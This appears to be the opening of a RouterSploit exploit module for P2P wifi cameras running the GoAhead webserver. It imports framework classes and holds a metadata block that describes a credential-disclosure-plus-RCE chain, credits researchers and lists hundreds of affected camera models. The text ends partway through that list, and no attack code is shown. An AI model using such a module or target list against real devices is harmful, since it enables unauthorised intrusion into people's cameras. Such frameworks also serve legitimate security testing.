import time
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        'name': 'P2P wificam remote code execution',
        'description': """A credential disclosure in several cameras which
        utilize the GoAhead webserver, combined with an authenticated RCE allows for
        unauthenticated remote code execution.""",
        'authors': (
            'Pierre Kim <pierre.kim.sec@gmail.com>',  # CVE-2017-8225 and others
            'zh4ck <@zh4ck>',                        # discovery of the authenticated RCE
            'casept <davids.paskevics@gmail.com>',  # routesploit module
        ),
        'references': (
            'https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html',
            'https://jumpespjump.blogspot.com/2015/09/how-i-hacked-my-ip-camera-and-found.html'
        ),
        'devices': (
            '3G+IPCam Other',
            '3SVISION Other',
            '3com CASA',
            '3com Other',
            '3xLogic Other',
            '3xLogic Radio',
            '4UCAM Other',
            '4XEM Other',
            '555 Other',
            '7Links 3677',
            '7Links 3677-675',
            '7Links 3720-675',
            '7Links 3720-919',
            '7Links IP-Cam-in',
            '7Links IP-Wi-Fi',
            '7Links IPC-760HD',
            '7Links IPC-770HD',
            '7Links Incam',
            '7Links Other',
            '7Links PX-3615-675',
            '7Links PX-3671-675',
            '7Links PX-3720-675',
            '7Links PX3309',
            '7Links PX3615',
            '7Links ipc-720',
            '7Links px-3675',
            '7Links px-3719-675',
            '7Links px-3720-675',
            'A4Tech Other',
            'ABS Other',
            'ADT RC8021W',
            'AGUILERA AQUILERA',
            'AJT AJT-019129-BBCEF',
            'ALinking ALC',
            'ALinking Other',
            'ALinking dax',
            'AMC Other',
            'ANRAN ip180',
            'APKLINK Other',
            'AQUILA AV-IPE03',
            'AQUILA AV-IPE04',
            'AVACOM 5060',
            'AVACOM 5980',
            'AVACOM H5060W',
            'AVACOM NEW',
            'AVACOM Other',
            'AVACOM h5060w',
            'AVACOM h5080w',
            'Acromedia IN-010',
            'Acromedia Other',
            'Advance Other',
            'Advanced+home lc-1140',
            'Aeoss J6358',
            'Aetos 400w',
            'Agasio A500W',
            'Agasio A502W',
            'Agasio A512',
            'Agasio A533W',
            'Agasio A602W',
            'Agasio A603W',
            'Agasio Other',
            'AirLink Other',
            'Airmobi HSC321',
            'Airsight Other',
            'Airsight X10',
            'Airsight X34A',
            'Airsight X36A',
            'Airsight XC39A',
            'Airsight XX34A',
            'Airsight XX36A',
            'Airsight XX40A',
            'Airsight XX60A',
            'Airsight x10',
            'Airsight x10Airsight',
            'Airsight xc36a',
            'Airsight xc49a',
            'Airsight xx39A',
            'Airsight xx40a',
            'Airsight xx49a',
            'Airsight xx51A',
            'Airsight xx51a',
            'Airsight xx52a',
            'Airsight xx59a',
            'Airsight xx60a',
            'Akai AK7400',
            'Akai SP-T03WP',
            'Alecto 150',
            'Alecto Atheros',
            'Alecto DVC-125IP',
            'Alecto DVC-150-IP',
            'Alecto DVC-1601',
            'Alecto DVC-215IP',
            'Alecto DVC-255-IP',
            'Alecto dv150',
            'Alecto dvc-150ip',
            'Alfa 0002HD',
            'Alfa Other',
            'Allnet 2213',
            'Allnet ALL2212',
            'Allnet ALL2213',
            'Amovision Other',
            'Android+IP+cam IPwebcam',
            'Anjiel ip-sd-sh13d',
            'Apexis AH9063CW',
            'Apexis APM-H803-WS',
            'Apexis APM-H804-WS',
            'Apexis APM-J011',
            'Apexis APM-J011-Richard',
            'Apexis APM-J011-WS',
            'Apexis APM-J012',
            'Apexis APM-J012-WS',
            'Apexis APM-J0233',
            'Apexis APM-J8015-WS',
            'Apexis GENERIC',
            'Apexis H',
            'Apexis HD',
            'Apexis J',
            'Apexis Other',
            'Apexis PIPCAM8',
            'Apexis Pyle',
            'Apexis XF-IP49',
            'Apexis apexis',
            'Apexis apm-',
            'Apexis dealextreme',
            'Aquila+Vizion Other',
            'Area51 Other',
            'ArmorView Other',
            'Asagio A622W',
            'Asagio Other',
            'Asgari 720U',
            'Asgari Other',
            'Asgari PTG2',
            'Asgari UIR-G2',
            'Atheros ar9285',
            'AvantGarde SUMPPLE',
            'Axis 1054',
            'Axis 241S',
            'B-Qtech Other',
            'B-Series B-1',
            'BRAUN HD-560',
            'BRAUN HD505',
            'Beaulieu Other',
            'Bionics Other',
            'Bionics ROBOCAM',
            'Bionics Robocam',
            'Bionics T6892WP',
            'Bionics t6892wp',
            'Black+Label B2601',
            'Bravolink Other',
            'Breno Other',
            'CDR+king APM-J011-WS',
            'CDR+king Other',
            'CDR+king SEC-015-C',
            'CDR+king SEC-016-NE',
            'CDR+king SEC-028-NE',
            'CDR+king SEC-029-NE',
            'CDR+king SEC-039-NE',
            'CDR+king sec-016-ne',
            'CDXX Other',
            'CDXXcamera Any',
            'CP+PLUS CP-EPK-HC10L1',
            'CPTCAM Other',
            'Camscam JWEV-372869-BCBAB',
            'Casa Other',
            'Cengiz Other',
            'Chinavasion Gunnie',
            'Chinavasion H30',
            'Chinavasion IP611W',
            'Chinavasion Other',
            'Chinavasion ip609aw',
            'Chinavasion ip611w',
            'Cloud MV1',
            'Cloud Other',
            'CnM IP103',
            'CnM Other',
            'CnM sec-ip-cam',
            'Compro NC150/420/500',
            'Comtac CS2',
            'Comtac CS9267',
            'Conceptronic CIPCAM720PTIWL',
            'Conceptronic cipcamptiwl',
            'Cybernova Other',
            'Cybernova WIP604',
            'Cybernova WIP604MW',
            'D-Link DCS-910',
            'D-Link DCS-930L',
            'D-Link L-series',
            'D-Link Other',
            'DB+Power 003arfu',
            'DB+Power DBPOWER',
            'DB+Power ERIK',
            'DB+Power HC-WV06',
            'DB+Power HD011P',
            'DB+Power HD012P',
            'DB+Power HD015P',
            'DB+Power L-615W',
            'DB+Power LA040',
            'DB+Power Other',
            'DB+Power Other2',
            'DB+Power VA-033K',
            'DB+Power VA0038K',
            'DB+Power VA003K+',
            'DB+Power VA0044_M',
            'DB+Power VA033K',
            'DB+Power VA033K+',
            'DB+Power VA035K',
            'DB+Power VA036K',
            'DB+Power VA038',
            'DB+Power VA038k',
            'DB+Power VA039K',
            'DB+Power VA039K-Test',
            'DB+Power VA040',
            'DB+Power VA390k',
            'DB+Power b',
            'DB+Power b-series',
            'DB+Power extcams',
            'DB+Power eye',
            'DB+Power kiskFirstCam',
            'DB+Power va033k',
            'DB+Power va039k',
            'DB+Power wifi',
            'DBB IP607W',
            'DEVICECLIENTQ CNB',
            'DKSEG Other',
            'DNT CamDoo',
            'DVR DVR',
            'DVS-IP-CAM Other',
            'DVS-IP-CAM Outdoor/IR',
            'Dagro DAGRO-003368-JLWYX',
            'Dagro Other',
            'Dericam H216W',
            'Dericam H502W',
            'Dericam M01W',
            'Dericam M2/6/8',
            'Dericam M502W',
            'Dericam M601W',
            'Dericam M801W',
            'Dericam Other',
            'Digix Other',
            'Digoo BB-M2',
            'Digoo MM==BB-M2',
            'Digoo bb-m2',
            'Dinon 8673',
            'Dinon 8675',
            'Dinon SEGEV-105',
            'Dinon segev-103',
            'Dome Other',
            'Drilling+machines Other',
            'E-Lock 1000',
            'ENSIDIO IP102W',
            'EOpen Open730',
            'EST ES-IP602IW',
            'EST IP743W',
            'EST Other',
            'EZCam EPK-EP10L1',
            'EZCam EZCam',
            'EZCam Other',
            'EZCam PAN/TILT',
            'EZCam Pan/Tilt',
            'EasyCam EC-101HD',
            'EasyCam EC-101HDSD',
            'EasyCam EC-101SD',
            'EasyCam EC-102',
            'EasyCam Other',
            'EasyN 187',
            'EasyN 1BF',
            'EasyN 720P',
            'EasyN F',
            'EasyN F-136',
            'EasyN F-M136',
            'EasyN F-M166',
            'EasyN F-M181',
            'EasyN F-M1b1',
            'EasyN F-SERIES',
            'EasyN F133',
            'EasyN F2-611B',
            'EasyN F3',
            'EasyN F3-166',
            'EasyN F3-176M',
            'EasyN F3-M166',
            'EasyN F3-SERIES',
            'EasyN F3-Series',
            'EasyN F3-m187',
            'EasyN F3M187',
            'EasyN FS-613A-M136',
            'EasyN FS-613B',
            'EasyN FS-613B-M166',
            'EasyN FS-613B-MJPEG',
            'EasyN FS613',
            'EasyN F_M10R',
            'EasyN H3-V10R',
            'EasyN H6-M137h',
            'EasyN M091',
            'EasyN Other',
            'EasyN est-007660-611b',
            'EasyN est-007660333',
            'EasyN f',
            'EasyN f-Series',
            'EasyN f138',
            'EasyN f_series',
            'EasyN fseries',
            'EasyN kitch',
            'EasyN s',
            'EasySE F/B/N/I',
            'EasySE H3',
            'EasySE H3e',
            'EasySE Other',
            'Ebode IPV38W',
            'Ebode IPV58',
            'Ebode Other',
            'Ego Other',
            'Elro 901',
            'Elro 903',
            'Elro 903IP',
            'Elro C7031P',
            'Elro C703IP2',
            'Elro C704-IP',
            'Elro C704IP',
            'Elro C704IP.2',
            'Elro C704ip',
            'Elro C803IP',
            'Elro C903IP',
            'Elro C903IP.2',
            'Elro C904IP',
            'Elro C904IP.2',
            'Elro IP901',
            'Elro Other',
            'Eminent 6564',
            'Eminent EM6220',
            'Eminent EM6564',
            'Eminent em6220',
            'Esky C5900',
            'Esky L',
            'Esky Live',
            'Esky c5900',
            'Eura-Tech IC-03C3',
            'EyeCam ICAM-608',
            'EyeCam IP65IW',
            'EyeCam Other',
            'EyeCam STORAGEOPTIONS',
            'EyeIPCam IP901W',
            'EyeSight ES-IP607W',
            'EyeSight ES-IP811W',
            'EyeSight ES-IP909IW',
            'EyeSight ES-IP935FW',
            'EyeSight ES-IP935IW',
            'EyeSight IP910IW',
            'EyeSight IP915IW',
            'EyeSight Other',
            'EyeSight ip609IW',
            'EyeSight ip909iw',
            'EyeSight ip915iw',
            'EyeSight mjpeg',
            'EyeSpy247 Other',
            'F-Series FSERIES',
            'F-Series Ip',
            'F-Series Other',
            'F-Series ip',
            'First+Concept Other',
            'Focuscam F19821W',
            'Foscam FI18904w',
            'Foscam FI18905E',
            'Foscam FI18905W',
            'Foscam FI18906w',
            'Foscam FI1890W',
            'Foscam FI18910E',
            'Foscam FI18910W',
            'Foscam FI18910w',
            'Foscam FI18916W',
            'Foscam FI18918W',
            'Foscam FI18919W',
            'Foscam FI19810W',
            'Foscam FI8094W',
            'Foscam FI81904W',
            'Foscam FI8601W',
            'Foscam FI8602W',
            'Foscam FI8606W',
            'Foscam FI8610w',
            'Foscam FI8903W',
            'Foscam FI8903W_Elita',
            'Foscam FI8904',
            'Foscam FI8904W',
            'Foscam FI8905E',
            'Foscam FI8905W',
            'Foscam FI8905w',
            'Foscam FI8906w',
            'Foscam FI8907W',
            'Foscam FI8908W',
            'Foscam FI8909W',
            'Foscam FI890W',
            'Foscam FI8910',
            'Foscam FI8910E',
            'Foscam FI8910W',
            'Foscam FI8910W_DW',
            'Foscam FI8910w',
            'Foscam FI8916W',
            'Foscam FI8918',
            'Foscam FI89180w',
            'Foscam FI8918E',
            'Foscam FI8918W',
            'Foscam FI8918w',
            'Foscam FI8919W',
            'Foscam FI9804W',
            'Foscam FI9805E',
            'Foscam FI9810',
            'Foscam FI9810W',
            'Foscam FI9818',
            'Foscam FI9820w',
            'Foscam FI9821W',
            'Foscam FI9821w',
            'Foscam FL8910',
            'Foscam FS18908W',
            'Foscam FS8910',
            'Foscam Fi8910',
            'Foscam Other',
            'Foscam fI8989w',
            'Foscam fi1890w',
            'Foscam fl8910w',
            'FoxCam PTZ2084-L',
            'GIGA gb',
            'GT+ROAD HS-006344-SPSLM',
            'General Other',
            'Generic All-in-one',
            'Generic Billy',
            'Generic DomeA-Outdoor',
            'Generic IP',
            'Generic Other',
            'Gi-star+srl IP6031W',
            'Gigaeye GB',
            'GoAhead EC-101SD',
            'GoAhead GoAheadWebs',
            'GoAhead IPCAM1',
            'GoAhead IPCAM2',
            'GoAhead Other',
            'GoAhead thedon',
            'GoCam Other',
            'Goclever EYE',
            'Goclever EYE2',
            'Gotake GTK-TH01B',
            'H+264+network+DVR 720p',
            'H+264+network+DVR Other',
            'H.264 Other',
            'H6837WI Other',
            'HD+IPC Other',
            'HD+IPC SV3C',
            'HDIPCAM Other',
            'Heden CAMH04IPWE',
            'Heden CAMHED02IPW',
            'Heden CAMHED04IP',
            'Heden CAMHED04IPWN',
            'Heden CAMHEDIPWP',
            'Heden Other',
            'Heden VisionCam',
            'Heden visionCam',
            'HiSilicon Other',
            'Hikvision DS-2CD2132',
            'Histream RTSP',
            'HooToo F-SERIES',
            'HooToo HOOTOO',
            'HooToo HT-IP006',
            'HooToo HT-IP006N',
            'HooToo HT-IP009HDP',
            'HooToo HT-IP206',
            'HooToo HT-IP207F',
            'HooToo HT-IP210HDP',
            'HooToo HT-IP210P',
            'HooToo HT-IP212',
            'HooToo IP009HDP',
            'HooToo Other',
            'HooToo apm-h803-mpc',
            'Hsmartlink Other',
            'Hungtek WIFI',
            'ICAMView Other',
            'ICam I908W',
            'ICam IP-1',
            'ICam Other',
            'ICam Other2',
            'ICam dome',
            'INISOFT-CAM Stan',
            'INSTAR 4010',
            'INVID Other',
            'IO+Data Other',
            'IP66 Other',
            'IPC IPC02',
            'IPC Other',
            'IPC S5030-TF',
            'IPC S5030-m',
            'IPC SRICAM',
            'IPCC 3XPTZ',
            'IPCC 7210W',
            'IPCC IPCC-7210W',
            'IPCC x01',
            'IPTeles Other',
            'IPUX ip-100',
            'ISIT Other',
            'IZOtech Other',
            'IZTOUCH 0009',
            'IZTOUCH A001',
            'IZTOUCH IZ-009',
            'IZTOUCH LTH-A8645-c15',
            'IZTOUCH Other',
            'IZTOUCH Other1',
            'IZTOUCH ap001',
            'IeGeek Other',
            'IeGeek ukn',
            'Inkovideo V-104',
            'Iprobot3 Other',
            'JRECam JM3866W',
            'JWcam JWEV',
            'JWcam Other',
            'Jaycar 3834',
            'Jaycar 720P',
            'Jaycar Other',
            'Jaycar QC-3831',
            'Jaycar QC-3832',
            'Jaycar QC-3834',
            'Jaycar QC-3836',
            'Jaycar QC-3839',
            'Jaytech IP6021W',
            'JhempCAM Back',
            'JhempCAM Other',
            'KaiKong 1601',
            'KaiKong 1602w',
            'KaiKong Other',
            'KaiKong SIP',
            'KaiKong SIP1602',
            'KaiKong SIP1602W',
            'KaiKong sip',
            'KaiKong sip1602w',
            'Kenton gjc02',
            'Kinson C720PWIP',
            'Klok Other',
            'Knewmart KW01B',
            'Knewmart KW02B',
            'Kogan KAIPC01BLKA',
            'Kogan KAIPCO1BLKA',
            'Kogan Other',
            'Kogan encoder',
            'Kogan kaipc01blkb',
            'Kompernass IUK',
            'Koolertron Other',
            'Koolertron PnP',
            'Koolertron SP-SHEX21-SL',
            'LC+security Other',
            'LW lw-h264tf',
            'LYD H1385H',
            'Lager Other',
            'Leadtek C351',
            'LevelOne 1010/2010',
            'Libor Other',
            'LifeTech MyLifeTech',
            'LifeTech Other',
            'LifeTech dd',
            'Lilly Other',
            'Linq Other',
            'Lloyds 1107',
            'Loftek CXS',
            'Loftek Nexus',
            'Loftek Other',
            'Loftek SPECTOR',
            'Loftek Sendinel',
            'Loftek Sentinel',
            'LogiLink WC0030A',
            'LogiLink wc0044',
            'Logitech C920',
            'MCL 610',
            'MJPEG Other',
            'Maginon 100',
            'Maginon 10AC',
            'Maginon 20C',
            'Maginon IP-20c',
            'Maginon IPC',
            'Maginon IPC-1',
            'Maginon IPC-10',
            'Maginon IPC-100',
            'Maginon IPC-100AC',
            'Maginon IPC-10AC',
            'Maginon IPC-2',
            'Maginon IPC-20',
            'Maginon IPC20C',
            'Maginon IPC_1A',
            'Maginon Other',
            'Maginon SUPRA',
            'Maginon Supra',
            'Maginon ipc',
            'Maginon ipc-1a',
            'Maginon ipc100a',
            'Maginon ipx',
            'Maginon w2',
            'Marmitek GM-8126',
            'Maygion IP',
            'Maygion OTHER2',
            'Maygion Other',
            'Maygion V3',
            'Maygion black',
            'Mediatech mt4050',
            'Medisana SmartBabyMonitor',
            'Merlin IP',
            'Merlin Other',
            'Merlin vstc',
            'Messoa Other',
            'Mingyoushi S6203Y-WR',
            'Momentum 2002',
            'Momentum MO-CAM',
            'NEXCOM S-CAM',
            'NIP NIP-004500-KMTLU',
            'NIP NIP-075007-UPHTF',
            'NIP NIP-11BGPW',
            'NIP NIP-14',
            'NTSE Other',
            'Neewer Other',
            'Neewer V-100',
            'Neo+CoolCam NIP',
            'Neo+CoolCam NIP-02(OAM)',
            'Neo+CoolCam NIP-06',
            'Neo+CoolCam NIP-066777-BWESL',
            'Neo+CoolCam NIP-102428-DFBEF',
            'Neo+CoolCam NIP-H20(OZX)',
            'Neo+CoolCam OBJ-007260-LYLDU',
            'Neo+CoolCam Other',
            'Neo+CoolCam neo',
            'Neo+CoolCam nip-11',
            'Neo+CoolCam nip-20',
            'Ness Other',
            'NetView Other',
            'Netcam Dual-HD',
            'Netcam HSL-232245-CWXES',
            'Netcam OUVIS',
            'Netcam Other',
            'Netware Other',
            'Nexxt+Solution Xpy',
            'Nixzen Other',
            'NorthQ NQ-9006',
            'Office+One CM-I11123BK',
            'Office+One IP-900',
            'Office+One IP-99',
            'Office+One Other',
            'Office+One SC-10IP',
            'Office+One ip-900',
            'Office+One ip900',
            'Opexia OPCS',
            'Optica+Video FI-8903W',
            'Optica+Video FI-8918W',
            'Optica+Video Other',
            'Otto 4eye',
            'Overmax CamSpot',
            'Overmax Camspot',
            'OwlCam CP-6M201W',
            'P2p wificam',
            'PCS Other',
            'Panasonic BL-C131A',
            'PeopleFu IPC-674',
            'PeopleFu IPCAM1',
            'PeopleFu IPCAM2',
            'PeopleFu IPCAM3',
            'PeopleFu IPCAM5',
            'Pixpo 1Z074A2A0301627785',
            'Pixpo PIX006428BFYZY',
            'Pixpo PIX009491MLJYM',
            'Pixpo PIX009495HURFE',
            'Pixpo PIX010584DFACE',
            'Plaisio IP',
            'Planex Other',
            'Planex PLANEX',
            'Polariod P351S',
            'Polaroid IP-100',
            'Polaroid IP-101W',
            'Polaroid IP-200B',
            'Polaroid IP-201B',
            'Polaroid IP-350',
            'Polaroid IP-351S',
            'Polaroid IP-360S',
            'Polaroid IP-810W',
            'Polaroid IP-810WZ',
            'Polaroid Other',
            'Polaroid POLIP101W',
            'Polaroid POLIP201B',
            'Polaroid POLIP201W',
            'Polaroid POLIP351S',
            'Polaroid POLIP35i5',
            'PowerLead Caue',
            'PowerLead PC012',
            'ProveCam IP2521',
            'Provision 717',
            'Provision F-717',
            'Provision F-737',
            'Provision PT-737',
            'Provision WP-711',
            'Provision WP-717P',
            'Pyle HD',
            'Pyle HD22',
            'Pyle HD46',
            'Pyle Mine',
            'Pyle PIPCAM15',
            'Pyle Pipcam12',
            'Pyle cam5',
            'Pyle pipcam25',
            'Pyle pipcam5',
            'Q-nest QN-100S',
            'Q-nest qn-100s',
            'Queback 720p',
            'ROCAM NC-400',
            'ROCAM NC-500',
            'ROCAM NC300',
            'ROCAM NC300-1',
            'ROHS IP',
            'ROHS none',
            'RTX 06R',
            'RTX DVS',
            'RTX IP-06R',
            'RTX IP-26H',
            'RTX Other',
            'Rollei safetycam-10hd',
            'SES Other',
            'SKJM Other',
            'SST SST-CNS-BUI18',
            'SVB+International SIP-018262-RYERR',
            'SafeHome 278042',
            'SafeHome 616-W',
            'SafeHome IP601W-hd',
            'SafeHome Other',
            'SafeHome VGA',
            'SafeHome iprobot',
            'Samsung Other',
            'Santec-Video Other',
            'Sarotech IPCAM-1000',
            'Sarotech ip300',
            'Scricam 004',
            'Scricam 192.168.1.7',
            'Scricam AP-004',
            'Scricam AP-009',
            'Scricam AP0006',
            'Scricam AP006',
            'Secam+CCTV IPCAM',
            'Secam+CCTV Other',
            'Seculink 10709',
            'Seculink Other',
            'Secur+Eye xxc5330',
            'Seisa JK-H616WS',
            'Senao PTZ-01H',
            'Sequrecam Other',
            'Sequrecam PNP-125',
            'Sercomm Other',
            'Shenwhen+Neo+Electronic+Co NC-541',
            'Shenwhen+Neo+Electronic+Co Other',
            'Shenwhen+Neo+Electronic+Co X-5000B',
            'Shenzhen 720P',
            'Shixin+China IP-129HW',
            'Siepem IPC',
            'Siepem S5001Y-BW',
            'Siepem S6203y',
            'Siepem S6211Y-WR',
            'Simi+IP+Camera+Viewer Other',
            'Sineoji Other',
            'Sineoji PT-315V',
            'Sineoji PT-3215P',
            'Sineoji PT-325IP',
            'Sinocam Other',
            'Sky+Genious Genious',
            'Skytronic IP',
            'Skytronic IP99',
            'Skytronic Other',
            'Skytronic WiFi',
            'Skytronic dome',
            'SmartEye Other',
            'SmartWares C723IP',
            'SmartWares c724ip',
            'SmartWares c923ip',
            'SmartWares c924ip',
            'Solwise SEC-1002W-IR',
            'Spy+Cameras WF-100PCX',
            'Spy+Cameras WF-110V',
            'Sricam 0001',
            'Sricam 004',
            'Sricam A0009',
            'Sricam A001',
            'Sricam AP-001',
            'Sricam AP-003',
            'Sricam AP-004',
            'Sricam AP-005',
            'Sricam AP-006',
            'Sricam AP-009',
            'Sricam AP-012',
            'Sricam AP-CAM',
            'Sricam AP0009',
            'Sricam AP002',
            'Sricam AP995',
            'Sricam Cam1',
            'Sricam Front',
            'Sricam Home',
            'Sricam Other',
            'Sricam SP005',
            'Sricam SP012',
            'Sricam SP013',
            'Sricam SP015',
            'Sricam SRICAM',
            'Sricam SRICAM1',
            'Sricam aj-c2wa-c118',
            'Sricam ap',
            'Sricam ap006',
            'Sricam ap1',
            'Sricam h.264',
            'Sricam sp013',
            'Sricctv A-0006',
            'Sricctv A-009',
            'Sricctv AJ-006',
            'Sricctv AP-0001',
            'Sricctv AP-0005',
            'Sricctv AP-0009',
            'Sricctv AP-001',
            'Sricctv AP-002',
            'Sricctv AP-003',
            'Sricctv AP-004',
            'Sricctv AP-004AF',
            'Sricctv AP-005',
            'Sricctv AP-006',
            'Sricctv AP-007',
            'Sricctv AP-008',
            'Sricctv AP-009',
            'Sricctv AP-011',
            'Sricctv AP-014',
            'Sricctv H-264',
            'Sricctv Other',
            'Sricctv P2P-BLACK',
            'Sricctv P2P-Black',
            'Sricctv SP-007',
            'Sricctv SR-001',
            'Sricctv SR-004',
            'Star+Vedia 6836',
            'Star+Vedia 7837-WIP',
            'Star+Vedia C-7835WIP',
            'Star+Vedia Other',
            'Star+Vedia T-6836WTP',
            'Star+Vedia T-7833WIP',
            'Star+Vedia T-7837WIP',
            'Star+Vedia T-7838WIP',
            'StarCam C33-X4',
            'StarCam EY4',
            'StarCam F6836W',
            'StarCam Other',
            'StarCam c7837wip',
            'Stipelectronics Other',
            'Storage+Options HOMEGUARD',
            'Storage+Options Other',
            'Storage+Options SON-IPC1',
            'Sumpple 610',
            'Sumpple 610S',
            'Sumpple 631',
            'Sumpple 960P',
            'Sumpple S601',
            'Sumpple S610',
            'Sumpple S631',
            'Sumpple S651',
            'Sumpple qd300',
            'Sumpple s631',
            'SunVision+US Other',
            'Sunbio Other',
            'Suneyes Other',
            'Suneyes SP-T01EWP',
            'Suneyes SP-T01WP',
            'Suneyes SP-TM01EWP',
            'Suneyes SP-TM01WP',
            'Suneyes SP-tm05wp',
            'Sunluxy H-264',
            'Sunluxy HZCam',
            'Sunluxy Other',
            'Sunluxy PTZ',
            'Sunluxy SL-701',
            'Supra+Space IPC',
            'Supra+Space IPC-1',
            'Supra+Space IPC-100AC',
            'Supra+Space IPC-10AC',
            'Supra+Space Other11',
            'Supra+Space ipc-20c',
            'Sure-Eye Other',
            'Surecom LN-400',
            'Swann 005FTCD',
            'Swann 440',
            'Swann 440-IPC',
            'Swann ADS-440',
            'Swann ADS-440-PTZ',
            'Swann ADS-CAMAX1',
            'Swann Other',
            'Swann SWADS-440-IPC',
            'Swann SWADS-440IPC-AU',
            'Sygonix 43176A',
            'Sygonix 43558A',
            'Szneo CAM0X',
            'Szneo CoolCam',
            'Szneo NIP',
            'Szneo NIP-0',
            'Szneo NIP-02',
            'Szneo NIP-031',
            'Szneo NIP-031H',
            'Szneo NIP-06',
            'Szneo NIP-12',
            'Szneo NIP-2',
            'Szneo NIP-20',
            'Szneo NIP-210485-ABABC',
            'Szneo NIP-26',
            'Szneo NIP-X',
            'Szneo NP-254095',
            'Szneo Other',
            'Szneo TFD',
            'TAS-Tech Other',
            'Technaxx tx-23',
            'Techview GM8126',
            'Techview QC-3638',
            'Techview qc3839',
            'Temvis Other',
            'Tenda C50S',
            'Tenda c30',
            'Tenda c5+',
            'Tenvis 0012',
            'Tenvis 3815',
            'Tenvis 3815-W',
            'Tenvis 3815W',
            'Tenvis 3815W.',
            'Tenvis 3815W2013',
            'Tenvis IP-319W',
            'Tenvis IP-319w',
            'Tenvis IP-391W',
            'Tenvis IP-391WHD',
            'Tenvis IP-602W',
            'Tenvis IP602W',
            'Tenvis IPROBOT',
            'Tenvis JP-3815W',
            'Tenvis JPT-3814WP2P',
            'Tenvis JPT-3815',
            'Tenvis JPT-3815-P2P',
            'Tenvis JPT-3815W',
            'Tenvis JPT-3815W+',
            'Tenvis JPT-3815WP2P',
            'Tenvis JPT-3815w',
            'Tenvis JPT-3818',
            'Tenvis MINI-319W',
            'Tenvis Mini-319',
            'Tenvis Other',
            'Tenvis PT-7131W',
            'Tenvis TH-661',
            'Tenvis TR-3818',
            'Tenvis TR-3828',
            'Tenvis TR3815W',
            'Tenvis TZ100',
            'Tenvis TZ100/IPROBOT3',
            'Tenvus JPG3815W',
            'Threeboy IP-660',
            'Topcam SL-30IPC01Z',
            'Topcam SL-720IPC02Z',
            'Topcam SL-910IW30',
            'Topica+CCTV Other',
            'Trivision NC-335PW-HD-10',
            'Trust NW-7500',
            'Turbo+X Endurance',
            'Turbo+X IIPC-20',
            'Uokoo 720P',
            'VCatch Other',
            'VCatch VC-MIC720HK',
            'Valtronics IP',
            'Valtronics Other',
            'Vandesc IP900',
            'Vantech Other',
            'Vantech PTZ',
            'Videosec+Security IPC-103',
            'Videosec+Security IPP-105',
            'Vimicro Other',
            'Vitek+CCTV Other',
            'Vstarcam 7823',
            'Vstarcam C-7824WIP',
            'Vstarcam C-7833WIP-X4',
            'Vstarcam C-7833wip',
            'Vstarcam C-7837WIP',
            'Vstarcam C-7838WIP',
            'Vstarcam C50S',
            'Vstarcam C7816W',
            'Vstarcam C7824WIP',
            'Vstarcam C782WIP',
            'Vstarcam C7842WIP',
            'Vstarcam C93',
            'Vstarcam C=7824WIP',
            'Vstarcam Cam360',
            'Vstarcam F-6836W',
            'Vstarcam H-6837WI',
            'Vstarcam H-6837WIP',
            'Vstarcam H-6850',
            'Vstarcam H-6850WIP',
            'Vstarcam H-6850wip',
            'Vstarcam ICAM-608',
            'Vstarcam Other',
            'Vstarcam T-6835WIP',
            'Vstarcam T-6836WTP',
            'Vstarcam T-6892wp',
            'Vstarcam T-7815WIP',
            'Vstarcam T-7833WIP',
            'Vstarcam T-7833wip',
            'Vstarcam T-7837WIP',
            'Vstarcam T-7838WIP',
            'Vstarcam T-7892WIP',
            'Vstarcam T6836WTP',
            'Vstarcam T7837WIP',
            'Vstarcam c7815wip',
            'Vstarcam c7833wip',
            'Vstarcam c7850wip',
            'Wanscam 00D6FB01980F',
            'Wanscam 106B',
            'Wanscam 118',
            'Wanscam 541-W',
            'Wanscam 543-W',
            'Wanscam 790',
            'Wanscam AJ-C0WA-198',
            'Wanscam AJ-C0WA-B106',
            'Wanscam AJ-C0WA-B116',
            'Wanscam AJ-C0WA-B168',
            'Wanscam AJ-C0WA-B1D8',
            'Wanscam AJ-C0WA-C0D8',
            'Wanscam AJ-C0WA-C116',
            'Wanscam AJ-C0WA-C126',
            'Wanscam AJ-C2WA-B118',
            'Wanscam AJ-C2WA-C116',
            'Wanscam AJ-C2WA-C118',
            'Wanscam AJ-C2WA-C198',
            'Wanscam AJ-COWA-B1D8',
            'Wanscam AJ-COWA-C116',
            'Wanscam AJ-COWA-C126',
            'Wanscam AJ-COWA-C128',
            'Wanscam AW00004J',
            'Wanscam B1D8-1',
            'Wanscam C-118',
            'Wanscam C-126',
            'Wanscam Colour',
            'Wanscam FI-18904w',
            'Wanscam FR-4020A2',
            'Wanscam FR4020A2',
            'Wanscam HD-100W',
            'Wanscam HW-0021',
            'Wanscam HW-0022',
            'Wanscam HW-0022HD',
            'Wanscam HW-0023',
            'Wanscam HW-0024',
            'Wanscam HW-0025',
            'Wanscam HW-0026',
            'Wanscam HW-0028',
            'Wanscam HW-0033',
            'Wanscam HW-0036',
            'Wanscam HW-0038',
            'Wanscam HW-0039',
            'Wanscam HW-22',
            'Wanscam HW0030',
            'Wanscam IP',
            'Wanscam JW-0001',
            'Wanscam JW-0003',
            'Wanscam JW-0004',
            'Wanscam JW-0004m',
            'Wanscam JW-0005',
            'Wanscam JW-0006',
            'Wanscam JW-0008',
            'Wanscam JW-0009',
            'Wanscam JW-0010',
            'Wanscam JW-0011',
            'Wanscam JW-0011l',
            'Wanscam JW-0012',
            'Wanscam JW-0018',
            'Wanscam JW-004',
            'Wanscam JW-009',
            'Wanscam JW-CD',
            'Wanscam JW000008',
            'Wanscam JW0009',
            'Wanscam JW001',
            'Wanscam JW0012',
            'Wanscam JW008',
            'Wanscam JWEV',
            'Wanscam JWEV-011777-NSRVV',
            'Wanscam JWEV-011921-RXSXT',
            'Wanscam JWEV-360171-BBEAC',
            'Wanscam JWEV-380096-CECDB',
            'Wanscam JWEV-PEPLOW',
            'Wanscam NBC-543W',
            'Wanscam NC-530',
            'Wanscam NC-541',
            'Wanscam NC-541/W',
            'Wanscam NC-541W',
            'Wanscam NC-541w',
            'Wanscam NC-543W',
            'Wanscam NCB-534W',
            'Wanscam NCB-540W',
            'Wanscam NCB-541W',
            'Wanscam NCB-541WB',
            'Wanscam NCB-543W',
            'Wanscam NCBL-618W',
            'Wanscam NCH-532MW',
            'Wanscam NCL-610W',
            'Wanscam NCL-612W',
            'Wanscam NCL-616W',
            'Wanscam NCL-S616W',
            'Wanscam Other',
            'Wanscam TG-002',
            'Wanscam WJ-0004',
            'Wanscam WX-617',
            'Wanscam Works',
